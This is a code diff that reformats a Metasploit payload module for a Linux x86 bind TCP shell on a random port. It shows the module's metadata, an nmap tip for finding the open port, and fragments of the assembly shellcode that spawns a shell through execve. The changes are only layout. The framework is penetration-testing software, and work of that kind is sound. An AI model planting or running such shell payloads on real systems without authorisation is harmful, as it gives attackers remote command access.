@@ -4,27 +4,33 @@
 ##
 
 module MetasploitModule
-
   CachedSize = 57
 
   include Msf::Payload::Single
   include Msf::Payload::Linux
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Linux Command Shell, Bind TCP Random Port Inline',
-      'Description'   => %q{
-        Listen for a connection in a random port and spawn a command shell.
-        Use nmap to discover the open port: 'nmap -sS target -p-'.
-      },
-      'Author'        => ['Geyslan G. Bem <geyslan[at]gmail.com>',
-                          'Aleh Boitsau <infosecurity[at]ya.ru>'],
-      'License'       => BSD_LICENSE,
-      'References'    => [ ['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/tiny_shell_bind_tcp_random_port.asm'],
-                           ['EDB', '41631'] ],
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_X86
-      ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux Command Shell, Bind TCP Random Port Inline',
+        'Description' => %q{
+          Listen for a connection in a random port and spawn a command shell.
+          Use nmap to discover the open port: 'nmap -sS target -p-'.
+        },
+        'Author' => [
+          'Geyslan G. Bem <geyslan[at]gmail.com>',
+          'Aleh Boitsau <infosecurity[at]ya.ru>'
+        ],
+        'License' => BSD_LICENSE,
+        'References' => [
+          ['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/tiny_shell_bind_tcp_random_port.asm'],
+          ['EDB', '41631']
+        ],
+        'Platform' => 'linux',
+        'Arch' => ARCH_X86
+      )
+    )
   end
 
   def generate
@@ -50,9 +56,9 @@ module MetasploitModule
           xor eax, eax     ;zeroed eax
           mov al,11        ;define execve()
           int 0x80         ;run syscall
-     EOS
-   else
-     payload = <<-EOS
+      EOS
+    else
+      payload = <<-EOS
         ; Avoiding garbage
         xor ebx, ebx
         mul ebx
@@ -120,6 +126,6 @@ module MetasploitModule
       EOS
     end
 
-   Metasm::Shellcode.assemble(Metasm::X86.new, payload).encode_string
+    Metasm::Shellcode.assemble(Metasm::X86.new, payload).encode_string
   end
 end
